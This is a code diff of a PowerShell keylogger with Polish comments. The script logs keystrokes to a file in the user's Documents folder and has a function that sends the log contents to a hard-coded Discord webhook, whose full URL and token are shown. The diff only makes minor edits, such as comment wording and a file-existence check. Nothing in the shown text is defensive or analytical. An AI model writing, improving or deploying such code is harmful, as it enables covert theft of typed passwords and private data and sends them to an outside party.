@@ -3,17 +3,18 @@ Add-Type -AssemblyName System.Drawing
 
 # Ścieżka do pliku logu
 $logPath = "$env:USERPROFILE\Documents\keylogger.txt"
-
-# Webhook Discorda
 $webhook = "https://discord.com/api/webhooks/1360942823821803540/9I6AgpJboKwPSgnCIfbxFshdEwhYTyOHrlYrNlnY-UkJvc1SjTyAtEu-8-KEyWv3iCuU"
 
-# Globalny bufor klawiszy
+# Zmienna globalna do logowania klawiszy
 $global:loggedKeys = ""
 
 # Funkcja zapisu logów
 function Save-Log {
     try {
         Write-Host "Zapisuję logi do pliku: $logPath"
+        if (-not (Test-Path $logPath)) {
+            Write-Host "Plik logu nie istnieje, tworzę..."
+        }
         $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
         $global:loggedKeys = ""
     } catch {
@@ -21,7 +22,7 @@ function Save-Log {
     }
 }
 
-# Funkcja wysyłania na Discord
+# Funkcja wysyłania logów na Discorda
 function Send-To-Discord {
     if (Test-Path $logPath) {
         $content = Get-Content $logPath -Raw
